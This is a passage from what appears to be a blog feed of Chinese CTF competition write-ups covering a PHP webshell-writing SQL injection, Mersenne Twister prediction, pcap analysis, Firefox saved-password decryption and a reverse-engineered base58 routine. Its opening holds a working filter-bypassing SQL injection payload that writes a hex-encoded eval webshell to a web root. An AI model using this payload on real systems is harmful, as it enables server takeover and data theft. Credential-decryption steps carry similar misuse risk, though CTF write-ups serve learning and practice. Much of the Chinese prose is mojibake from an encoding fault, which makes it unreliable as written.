¼å¯æ³¨é‡Šç»•è¿‡ï¼Œ<code>0x</code>åŒå†™ç»•è¿‡ã€‚</p><p>payload:</p><p><code>user=-1&#39;/**/uni union on/**/selselectect/**/00xx3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,2,3,4,5/**/int into o/**/outoutfilefile/**/&#39;/var/www/html/2.php&#39;%23&amp;password=ss&amp;code=&amp;submit=true&amp;submit.x=46&amp;submit.y=24</code></p><p>å†™å…¥shellï¼Œèšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•æ‰¾åˆ°flagã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;2021 DASCTFå®æˆ˜ç²¾è‹±å¤ä»¤è¥é¢„çƒ­èµ›&lt;br&gt;DASCTF July x CBCTF 4th&lt;br&gt;ä¸»åŠå•ä½: å®‰æ’ä¿¡æ¯ã€æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ç½‘ç»œç©ºé—´å®‰å…¨å­¦é™¢&lt;br&gt;ç«èµ›æ—¶é—´: 2021å¹´7æœˆ31æ—¥10:00- 2021å¹´8æœˆ1æ—¥18:00&lt;br&gt;</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021èµ›" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF x DASCTFåº”æ€¥æŒ‘æˆ˜æ¯</title>
    <link href="https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/"/>
    <id>https://lazzzaro.github.io/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/</id>
    <published>2021-06-26T09:31:36.000Z</published>
    <updated>2021-06-29T11:50:57.838Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>æŒ‡å¯¼å•ä½: ä¸­å›½ç§»åŠ¨é€šä¿¡è”åˆä¼š<br>ä¸»åŠå•ä½: é˜²ç¾ç§‘æŠ€å­¦é™¢ä¿¡æ¯å·¥ç¨‹å­¦é™¢æ­å·å®‰æ’ä¿¡æ¯æŠ€æœ¯è‚¡ä»½æœ‰é™å…¬å¸<br>æœ¬æ¬¡å‘½é¢˜: Ginkgoæˆ˜é˜Ÿ<br>æ¯”èµ›æ—¶é—´: 2021å¹´6æœˆ26æ—¥09:00-17:00<br>æŠ¥åæ—¶é—´: 2021å¹´6æœˆ21æ—¥19:30-6æœˆ26æ—¥9:00<br>æŠ¥ååœ°å€: buuoj.cn/das</p><p>Rank: 40</p><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h3><blockquote><p>flagæ ¼å¼ä¸º GKCTF{}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>():</span></span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">64</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        file.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">96</span>))+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    file.close()</span><br><span class="line">get_mask()</span><br><span class="line">flag = md5(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)).encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></blockquote><p>Pythonä¸­randomæ¨¡å—é‡‡ç”¨æ¢…æ£®æ—‹è½¬ç®—æ³•ï¼ˆMT19937ï¼‰ç”Ÿæˆä¼ªéšæœºåºåˆ—ä¸­çš„å…ƒç´ ï¼Œè¯¥PRNGé‡‡ç”¨32ä½çš„stateå’Œ32ä½çš„è¾“å‡ºï¼Œåœ¨è·å¾—è¶³å¤Ÿè¿ç»­è¾“å‡ºçš„æƒ…å†µä¸‹ï¼Œæ¢…æ£®æ—‹è½¬ç®—æ³•æ¥ä¸‹æ¥çš„è¾“å‡ºå€¼æ˜¯å¯ä»¥å‡†ç¡®é¢„æµ‹çš„ã€‚</p><p>æ ¹æ® <code>random.txt</code> ä¸­104ç»„ <code>random.getrandbits()</code> å‡½æ•°è¾“å‡ºå€¼ï¼Œåˆ©ç”¨é¢„æµ‹å·¥å…· <a href="https://github.com/kmyk/mersenne-twister-predictor">Mersenne Twister Predictor</a> æ¥æ±‚å‡ºä¸‹ä¸€ä¸ªéšæœºæ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> mt19937predictor <span class="keyword">import</span> MT19937Predictor</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">predictor = MT19937Predictor()</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;random.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c1 = []</span><br><span class="line">c2 = []</span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(file),<span class="number">3</span>):</span><br><span class="line">c1 += [<span class="built_in">int</span>(file[k].strip())]</span><br><span class="line">c2 += [<span class="built_in">int</span>(file[k+<span class="number">1</span>].strip())]</span><br><span class="line">c3 += [<span class="built_in">int</span>(file[k+<span class="number">2</span>].strip())]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">104</span>):</span><br><span class="line">predictor.setrandbits(c1[k], <span class="number">32</span>)</span><br><span class="line">predictor.setrandbits(c2[k], <span class="number">64</span>)</span><br><span class="line">predictor.setrandbits(c3[k], <span class="number">96</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5(<span class="built_in">str</span>(predictor.getrandbits(<span class="number">32</span>)).encode()).hexdigest())</span><br><span class="line"><span class="comment">#14c71fec812b754b2061a35a4f6d8421</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><blockquote><p>å¸ˆå‚…ä»¬ç©çš„å¼€å¿ƒ~ï¼ˆflagç”±flagå¤´åŒ…è£¹</p></blockquote><p>ç”¨Wiresharkæ‰“å¼€æµé‡åŒ…æ–‡ä»¶ <code>tmpshell.pcapng</code>ï¼Œè¿½è¸ªTCPæµï¼Œä»ç¬¬3ä¸ªæµå¼€å§‹æœ‰HTTP POSTæ•°æ®åŒ…ï¼Œéƒ½ä¸º <code>/g1nkgo/tmpshell.php</code> çš„RCEç»“æœã€‚</p><p>çœ‹åˆ°ç¬¬5ä¸ªæµæœ‰ <code>cat /f14g</code> å‘½ä»¤ç»“æœï¼Œä¸‹è½½ä¸‹æ¥16è¿›åˆ¶æŸ¥çœ‹ï¼Œä»æ–‡ä»¶å¤´ <code>1f8b0800000000000003</code>  çŸ¥ä¸ºgzipæ–‡ä»¶ï¼Œè§£å‹ï¼Œé€†åº+base64è§£ç å¾—ï¼š</p><p><code>[å›è½¦] [å›è½¦] [å›è½¦] ffllaagg{{}}WWeellcc))[åˆ é™¤] [åˆ é™¤] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCCCCCCC!!</code></p><p>ä¸¤ä¸ªç›¸åŒå­—ç¬¦ä¸€ç»„è¿˜åŸå¾—flagã€‚</p><p>â€‹    </p><h3 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h3><blockquote><p><a href="https://www.wjx.cn/vj/Y3msOw2.aspx">https://www.wjx.cn/vj/Y3msOw2.aspx</a></p><p>æ„Ÿè°¢å„ä½å¸ˆå‚…å‚ä¸æœ¬æ¬¡æ¯”èµ›ã€‚</p></blockquote><p>å¡«é—®å·ã€‚</p><p>â€‹    </p><h3 id="ä½ çŸ¥é“apngå—"><a href="#ä½ çŸ¥é“apngå—" class="headerlink" title="ä½ çŸ¥é“apngå—"></a>ä½ çŸ¥é“apngå—</h3><blockquote><p>ï¼ˆflagç”±flagå¤´åŒ…è£¹</p></blockquote><p>apngå›¾ç‰‡ï¼ˆåŠ¨æ€pngå›¾ç‰‡ï¼‰ï¼Œç”¨apngdiså·¥å…·æå–å„å¸§ï¼Œå‘ç°ç¬¬2ã€18ã€26å¸§æœ‰äºŒç»´ç ã€‚</p><p>QR_Researchèƒ½è¯†åˆ«å‡ºç¬¬18å¸§ä¸º <code>-ad20</code>ï¼Œä»¥åŠç¬¬26å¸§ä¸º <code>-0327-288a235370ea&#125;</code>ï¼Œç¬¬2å¸§å˜å½¢äºŒç»´ç æ— æ³•è¯†åˆ«ï¼Œç”¨åœ¨çº¿å·¥å…·<a href="https://merricx.github.io/qrazybox/">qrazybox</a>ç…§ç€æ‰‹ç»˜ï¼Œå¾—åˆ°ç»“æœ <code>flag&#123;a3c7e4e5</code>ã€‚</p><p>flagåº”ä¸ºuuidå½¢å¼ï¼Œè¿˜å°‘ä¸€æ®µï¼ŒæŒ‰ç…§2ã€18ã€26çš„é—´éš”ï¼Œåº”è¯¥åœ¨ç¬¬10å¸§é‡Œï¼ŒstegsolveæŸ¥çœ‹ç¬¬10å¸§ï¼Œåœ¨Red 2é€šé“çœ‹åˆ°äºŒç»´ç ï¼Œè¯†åˆ«ç»“æœ <code>-9b9d</code>ã€‚</p><p>æ‹¼æ¥å¾—flagã€‚</p><p>â€‹    </p><h3 id="é“¶æå²›ã®å¥‡å¦™å†’é™©"><a href="#é“¶æå²›ã®å¥‡å¦™å†’é™©" class="headerlink" title="é“¶æå²›ã®å¥‡å¦™å†’é™©"></a>é“¶æå²›ã®å¥‡å¦™å†’é™©</h3><blockquote><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ">https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ</a> å¯†ç : 04m0</p><p>é“¾æ¥ï¼š<a href="https://share.weiyun.com/hdikz5gL">https://share.weiyun.com/hdikz5gL</a> å¯†ç ï¼šyjyh3g</p><p>æ¸¸æˆé¢˜</p><p>1.æ¸¸æˆå¯åŠ¨éœ€è¦java1.8ç¯å¢ƒï¼Œæ— javaç¯å¢ƒä¼šè‡ªåŠ¨å¸®åŠ©å®‰è£…javaç¯å¢ƒï¼Œå¦‚æœä½ å·²ç»æœ‰java1.8ç¯å¢ƒï¼Œå³å¯æ— è§†è¿™æ¡ä¿¡æ¯ 2.å¯åŠ¨ â€œç‚¹å‡»å¯åŠ¨.exeâ€ æ–‡ä»¶ï¼Œæ‰“å¼€æ¸¸æˆå¯åŠ¨å™¨ï¼Œè¾“å…¥ä½ çš„ID 3.javaç¯å¢ƒé…ç½®å®Œæ¯•åï¼Œæœ€å¥½åˆ†é…æ¸¸æˆå†…å­˜è‡³å°‘ä¸º2048M 4.è¿›å…¥æ¸¸æˆåï¼Œæ ¹æ®æ¸¸æˆå†…çš„ä»»åŠ¡ç´¢å¼•å®Œæˆä»»åŠ¡ï¼Œå³å¯è·å–flag 5.è¿›å…¥æ¸¸æˆ ä¸€å®š ä¸€å®š ä¸€å®šè¦æ³¨æ„å¯¹è¯ä¿¡æ¯ï¼Œå¦åˆ™æ— æ³•é¡ºåˆ©çš„å®Œæˆä»»åŠ¡ 5.ç¥å¤§å®¶ç©çš„æ„‰å¿«</p></blockquote><p>Minecraftæ¸¸æˆï¼Œè¯•ç©äº†ä¸‹ä¸ç†Ÿæ‚‰ï¼Œå°è¯•ä»èµ„æºæ–‡ä»¶å…¥æ‰‹ã€‚</p><p>Everythingæœç´¢ <code>flag</code> å…³é”®å­—ï¼Œå‘ç° <code>.minecraft\saves\Where is the flag</code> å­˜æ¡£ç›®å½•ï¼Œæ¥ç€åœ¨ <code>customnpcs\quests\ä¸»çº¿</code> ç›®å½•ä¸­æ‰¾åˆ°ä¸»çº¿å¯¹åº”çš„jsonæ–‡ä»¶æœ‰å…³é”®å­—ç¬¦ä¸²ï¼š</p><p><code>2.json</code> ä¸­ï¼š<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 1\\nw3lc0me_\\n\\npart 2\\n291 -95 67\&quot;&#125;&quot;</code>ï¼Œ</p><p><code>3.json</code> ä¸­ï¼š<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 2\\nt0_9kctf_\\n\\npart 3 \\n324 -190 79\&quot;&#125;&quot;</code>ï¼Œ</p><p><code>4.json</code> ä¸­ï¼š<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 3\\n2021_\\n\\npart 4\\n362 -144 69\&quot;&#125;&quot;</code>ï¼Œ</p><p><code>5.json</code> ä¸­ï¼š<code>&quot;&#123;\&quot;text\&quot;:\&quot; Part 4\\nCheck_1n\\næ­å–œä½ ï¼Œ\\nå®Œæˆç­¾åˆ°ï¼Œ\\næ­¦è¿æ˜Œéš†ã€‚\&quot;&#125;&quot;</code>ï¼Œ</p><p>å‰é¢æ˜¯å†…å®¹ï¼Œåé¢æ˜¯ä¸‹ä¸€å¤„çš„åæ ‡ã€‚</p><p>æ‹¼æ¥ï¼ŒåŠ å¤´å¾—flagã€‚</p><p>â€‹    </p><h3 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox Forensics"></a>FireFox Forensics</h3><blockquote><p>å–è¯å¤§ä½¬è¯´è¿™æ˜¯ä¸€ä»½ç™»å½•å‡­è¯æ–‡ä»¶</p></blockquote><p>å¾—åˆ° <code>logins.json</code> å’Œ <code>key4.db</code> ä¸¤ä¸ªæ–‡ä»¶ï¼Œç»“åˆé¢˜ç›®çŸ¥æ˜¯ç«ç‹æµè§ˆå™¨å­˜å‚¨å¯†ç ä¿¡æ¯çš„å¯†é’¥æ–‡ä»¶å¯¹ï¼Œç›´æ¥åˆ©ç”¨<a href="https://github.com/lclevy/firepwd">Firepwdå·¥å…·</a>è§£æï¼ˆå°†ä¸¤ä¸ªæ–‡ä»¶ç½®äºè„šæœ¬åŒä¸€ç›®å½•ä¸‹ï¼‰ï¼š</p><p><code>python firepwd.py</code></p><p>ç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">globalSalt: b&#x27;1e26e84b2f01da28d865e7258f9003d16b9c43f2&#x27;</span><br><span class="line"> SEQUENCE &#123;</span><br><span class="line">   SEQUENCE &#123;</span><br><span class="line">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2</span><br><span class="line">     SEQUENCE &#123;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2</span><br><span class="line">         SEQUENCE &#123;</span><br><span class="line">           OCTETSTRING b&#x27;66a735e17767b37d83d464126b36d4269243f9e0c99405ccd68f442798f83129&#x27;</span><br><span class="line">           INTEGER b&#x27;01&#x27;</span><br><span class="line">           INTEGER b&#x27;20&#x27;</span><br><span class="line">           SEQUENCE &#123;</span><br><span class="line">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC</span><br><span class="line">         OCTETSTRING b&#x27;24eb241594de7ab37ec379d9ba06&#x27;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   OCTETSTRING b&#x27;946322a2b2978db6601e449e1bdf7c4d&#x27;</span><br><span class="line"> &#125;</span><br><span class="line">clearText b&#x27;70617373776f72642d636865636b0202&#x27;</span><br><span class="line">password check? True</span><br><span class="line"> SEQUENCE &#123;</span><br><span class="line">   SEQUENCE &#123;</span><br><span class="line">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2</span><br><span class="line">     SEQUENCE &#123;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2</span><br><span class="line">         SEQUENCE &#123;</span><br><span class="line">           OCTETSTRING b&#x27;56722302469f529a29dc73f28d6af3ed0ee483cceff05772e96e2313336816fd&#x27;</span><br><span class="line">           INTEGER b&#x27;01&#x27;</span><br><span class="line">           INTEGER b&#x27;20&#x27;</span><br><span class="line">           SEQUENCE &#123;</span><br><span class="line">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC</span><br><span class="line">         OCTETSTRING b&#x27;ef6a4df3e5fd7608c97df9e22092&#x27;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   OCTETSTRING b&#x27;51b24cd6a2672c312255d7f2dddeb67336fd56973b4302bb2eacf2270c251d41&#x27;</span><br><span class="line"> &#125;</span><br><span class="line">clearText b&#x27;673dec57458fb95bd50bdc9198541038970e5b3d518973a40808080808080808&#x27;</span><br><span class="line">decrypting login/password pairs</span><br><span class="line">https://ctf.g1nkg0.com:b&#x27;admin&#x27;,b&#x27;GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;&#x27;</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h3><blockquote><p>QQQTï¼Ÿä»€ä¹ˆä¸œè¥¿ï¼Ÿ</p><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ">https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ</a> å¯†ç : cfiq</p></blockquote><p>IDAæ‰“å¼€ï¼Œåœ¨å­—ç¬¦ä¸²çª—å£è·Ÿè¿› <code>56fkoP8KhwCf3v7CEz</code> æ‰¾åˆ°å…³é”®å‡½æ•° <code>sub_4012F0()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_4012F0</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// edx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp-8h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-8Ch] BYREF</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// [esp+18h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v19; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+20h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+24h] [ebp-7Ch] BYREF</span></span><br><span class="line">  _BYTE *v22; <span class="comment">// [esp+28h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v23[<span class="number">60</span>]; <span class="comment">// [esp+2Ch] [ebp-74h] BYREF</span></span><br><span class="line">  __int128 v24[<span class="number">2</span>]; <span class="comment">// [esp+68h] [ebp-38h] BYREF</span></span><br><span class="line">  __int64 v25; <span class="comment">// [esp+88h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  MEMORY[<span class="number">0x5FF6</span>](*(_DWORD *)(<span class="keyword">this</span>[<span class="number">6</span>] + <span class="number">4</span>), v16);</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  MEMORY[<span class="number">0x7C7C</span>](v16, v17);</span><br><span class="line">  LOBYTE(v26) = <span class="number">1</span>;</span><br><span class="line">  v19 = (<span class="keyword">const</span> <span class="keyword">char</span> *)MEMORY[<span class="number">0x7C48</span>](v17);</span><br><span class="line">  v24[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v24[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v25 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">strcpy</span>(v23, <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);</span><br><span class="line">  v21 = <span class="number">138</span> * <span class="built_in">strlen</span>(v19) / <span class="number">0x64</span>;</span><br><span class="line">  v14 = v21 + <span class="number">1</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v22 = (_BYTE *)MEMORY[<span class="number">0x8114</span>](v21 + <span class="number">1</span>);</span><br><span class="line">  v2 = v22;</span><br><span class="line">  sub_402C08(v22, <span class="number">0</span>, v14);</span><br><span class="line">  v3 = v19;</span><br><span class="line">  v20 = (<span class="keyword">int</span>)(v19 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v19) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v2[v21];</span><br><span class="line">    v18 = v4;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = ((<span class="keyword">char</span>)*v4 &lt;&lt; <span class="number">8</span>) + v3[v1];</span><br><span class="line">      v5 = v20 / <span class="number">58</span>;</span><br><span class="line">      *v4 = v20 % <span class="number">58</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v6 = (<span class="keyword">char</span>)*--v4;</span><br><span class="line">          v7 = (v6 &lt;&lt; <span class="number">8</span>) + v5;</span><br><span class="line">          v20 = v7 / <span class="number">58</span>;</span><br><span class="line">          *v4 = v7 % <span class="number">58</span>;</span><br><span class="line">          v5 = v20;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v20 );</span><br><span class="line">        v4 = v18;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ++v1 &gt;= <span class="built_in">strlen</span>(v19) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v22;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++v8;</span><br><span class="line">    <span class="keyword">while</span> ( !v2[v8] );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v21;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt;= v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = v2 - (_BYTE *)v24;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (<span class="keyword">char</span> *)v24 + v8++;</span><br><span class="line">      *v11 = v23[(<span 